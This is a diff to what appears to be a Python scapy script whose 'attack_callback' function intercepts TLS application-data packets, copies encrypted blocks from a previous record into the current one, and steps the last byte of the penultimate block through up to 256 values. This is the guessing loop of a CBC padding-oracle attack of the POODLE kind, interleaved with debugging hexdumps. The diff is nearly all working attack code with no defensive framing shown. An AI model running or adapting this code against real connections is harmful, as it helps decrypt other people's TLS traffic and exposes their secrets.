@@ -224,48 +224,40 @@ def attack_callback(packet):
     if tls_type == 23:
         # print(f"0x{last_byte_of_the_penultimate_block:02x}")
         if packet_count == 0:
-            previous_packet_tls_payload = bytes(pkt.getlayer('TLS'))[29:]
+            previous_packet_tls_payload = bytes(pkt.getlayer('TLS'))[34:]
             packet.accept()
             packet_count += 1
             return
         elif packet_count <= 256:
             print("packet_count", packet_count)
             last_byte_of_the_penultimate_block += 1
-            current_packet_tls_header = bytes(pkt.getlayer('TLS'))[:29]
-            current_packet_tls_payload = bytes(pkt.getlayer('TLS'))[29:]
-
-            print(len(bytes(pkt.getlayer('TLS')))-29)
 
             block_size = 8
 
-            # 真ん中のブロックを切り出し
-            payload_length = len(current_packet_tls_payload)
-            middle_index = payload_length // 2
-            start_index = (middle_index // block_size) * \
-                block_size  # ブロックの開始位置を調整
-            current_packet_tls_payload_middle_block = current_packet_tls_payload[
-                start_index:start_index + block_size]
+            payload_length = len(previous_packet_tls_payload)
+            payload_block_size = payload_length // block_size
 
-            # 最後のブロックを真ん中のブロックに置き換え
-            current_packet_tls_payload_modified = (
-                current_packet_tls_payload[:-(block_size+1)] +
-                bytes(last_byte_of_the_penultimate_block) +
-                current_packet_tls_payload_middle_block
-            )
+            middle_block_data = previous_packet_tls_payload[16:24]
 
-            # 新しいペイロードを作成
-            # new_payload = current_packet_tls_header + current_packet_tls_payload_modified
-            new_payload = current_packet_tls_header + previous_packet_tls_payload
+            until_the_last_byte_of_the_penultimate_block = previous_packet_tls_payload[:-9]
 
-            current_packet_first_application_data = bytes(
-                pkt.getlayer('TLS'))[:29]
-            current_packet_second_application_data_tls_header = bytes(pkt.getlayer('TLS'))[
-                29:34]
-            current_packet_second_application_data_tls_payload = bytes(pkt.getlayer('TLS'))[34:]
+            change_byte = last_byte_of_the_penultimate_block.to_bytes(1, 'big')
 
-            new_payload = current_packet_first_application_data + bytes(5) + current_packet_second_application_data_tls_payload
+            current_packet_not_need_to_change = bytes(pkt.getlayer('TLS'))[:34]
 
+            new_payload = current_packet_not_need_to_change + \
+                until_the_last_byte_of_the_penultimate_block + change_byte+middle_block_data
+
+            print("000000000000000000000000000000000")
+            hexdump(middle_block_data)
+            print("000000000000000000000000000000000")
+
+            print("---------------------------------not------------------")
+            hexdump(pkt.getlayer('TLS'))
+            print("---------------------------------not------------------")
+            print("---------------------------------modify------------------")
             hexdump(new_payload)
+            print("---------------------------------modify------------------")
 
             pkt[TCP].remove_payload()
             pkt[TCP].add_payload(new_payload)
